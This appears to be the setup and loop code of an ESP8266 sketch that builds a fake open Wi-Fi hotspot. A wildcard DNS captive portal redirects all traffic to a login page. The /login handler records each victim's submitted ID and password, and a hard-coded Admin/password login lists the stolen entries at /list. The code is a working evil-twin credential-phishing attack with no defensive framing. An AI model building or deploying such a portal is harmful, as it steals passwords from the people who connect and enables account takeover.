void setup() {

  Serial.begin(115200);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("CLIENTE-WIFI", "", 1);

  pinMode(output4, OUTPUT);
  digitalWrite(output4, HIGH);
  pinMode(output0, OUTPUT);
  digitalWrite(output0, LOW);

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/home", []() {
    server.send(200, "text/html", index_html3);
  });
  server.on("/reset", []() {
    server.send(200, "text/html", "");
    ESP.reset();
  });
  server.on("/list", []() {
    String logList = "<!DOCTYPE html><html><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><meta charset=\"utf-8\" /><head><style>button[type=submit]{width:100%;border:2px solid #1877f2;border-radius:4px;margin:6px 0;padding:12px;box-sizing:border-box;transition:.3s;color: white;font-weight: bold;font-size: 16px;background-color:#1877f2;} text[type=text]{margin:10px 0; font-size: 20px;}</style>";
    logList += "</head><body><form method=\"POST\" action=\"clean\"><button type=\"submit\">CLEAN</button></form><form method=\"POST\" action=\"refresh\"><button type=\"submit\">REFRESH</button></form><text type=text>";
    logList += String(list);
    logList += "</text></body></html>";
    server.send(200, "text/html", logList);
    digitalWrite(output4, HIGH);
  });
  server.on("/refresh", []() {
    server.sendHeader("Location", String("/list"), true);
    server.send ( 302, "text/html", "");
  });
  server.on("/clean", []() {
    list = "";
    server.sendHeader("Location", String("/list"), true);
    server.send ( 302, "text/html", "");
  });
  server.on("/stop", []() {
    server.send(200, "text/html", index_html2);
    delay(250);
    WiFi.mode(WIFI_STA);
    delay(500);
    WiFi.mode(WIFI_AP);
  });
  server.on("/login", []() {
    String ssid = urlDecode(server.arg("ssid"));
    String pass = urlDecode(server.arg("pass"));
    if (ssid == "Admin" && pass == "password") {
      server.sendHeader("Location", String("/list"), true);
      server.send ( 302, "text/html", "");
    } else {
      list += "ID: " + ssid + "<br>";

      list += "Senha: " +  pass + "<br><br>";
      list += "\n";
      server.sendHeader("Location", String("/stop"), true);
      server.send ( 302, "text/html", "");
      digitalWrite(output4, LOW);
    }
  });
  server.onNotFound([]() {
    server.send(200, "text/html", index_html);
  });
  server.begin();
}
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
